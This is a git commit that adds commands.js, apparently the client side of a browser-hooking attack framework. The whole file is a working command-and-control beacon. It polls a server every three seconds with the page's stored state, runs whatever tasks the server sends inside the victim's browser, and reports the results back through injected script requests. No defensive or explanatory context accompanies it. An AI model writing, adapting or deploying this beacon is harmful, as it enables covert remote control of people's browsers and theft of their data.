5741e42dc3bfddd684eb3adbc9d6c0e20949ea4e
UnknowWAKAN <104285232+UnknowWAKAN@users.noreply.github.com>
2025-10-08 23:23:10 +0700

    commands.js

---
+++ commands.js
@@ -0,0 +1,26 @@
+___.$(function($) {
+
+    // Triggers a command for processing
+    ___.fire = function(payload) {
+        // If it will respond with a callback, don't respond until that is called
+        if (payload.task.length > 0) {
+            payload.task.call(this, function(result) {
+                ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
+            });
+        // If it does not use a callback, respond straight away
+        } else {
+            ___.include(payload.return + "?key=" + payload.key + "&result=" + payload.task.call(this));
+        }
+    };
+
+    // If this script is living in the top level
+    if (top == window) {
+
+        // Constantly poll for commands, every 3 seconds
+        setInterval(function() {
+            var data = ___.load(); // Send persistent state information
+            data.time = Date.now(); // Prevent caching
+            ___.include('///queue?' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
+        }, 3000);
+    }
+});
